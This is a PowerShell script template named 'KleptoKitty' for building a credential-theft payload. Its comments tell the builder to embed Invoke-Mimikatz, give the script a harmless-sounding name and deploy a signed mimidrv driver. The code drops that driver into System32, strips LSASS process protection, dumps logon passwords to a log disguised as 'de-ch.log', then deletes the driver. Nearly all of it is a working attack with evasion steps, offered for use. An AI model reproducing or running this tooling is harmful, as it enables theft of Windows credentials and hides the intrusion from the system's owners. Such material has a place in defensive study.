<#

     =^._.^=
    _(      )/  KleptoKitty

    How to build payload:

    1.  Get Invoke-Mimikatz from Empire Framework
        https://github.com/BC-SECURITY/Empire/blob/master/data/module_source/credentials/
    
    2.  Use Mimikatz in script or replace it by your own version
        Build Mimikatz from code (Target Second_Release_PowerShell), convert powerkatz.dll to base64 and replace $PEBytes32 and $PEBytes64
   
    3.  Strip comments and use a harmless-sounding name for the script

    4.  Use mimidrv from Mimikatz, or build your own and sign it
        https://github.com/gentilkiwi/mimikatz
        https://www.scip.ch/en/?labs.20190919
#>

Function FormerlyKnownAsMimikatz {
    # <add the script here>
}

# Driver - Base64 encoded
$BlobDriver = "<add base64 string here>"
$PathDriver = "$env:SystemRoot\System32\drivers\mimidrv.sys"

# Log
$TargetBasePath = "Windows"
$TargetLogName = "de-ch.log"
$TargetLogLocalPath = "C:\$TargetBasePath\$TargetLogName"

# Deploy Driver, Run Mimikatz (remove LSASS protection)
cd "$env:SystemRoot\System32\drivers"
[IO.File]::WriteAllBytes($PathDriver, [Convert]::FromBase64String($BlobDriver))
FormerlyKnownAsMimikatz -Command """log $TargetLogLocalPath"" privilege::debug !+ ""!processprotect /remove /process:lsass.exe"" sekurlsa::logonpasswords !-"
Remove-Item $PathDriver
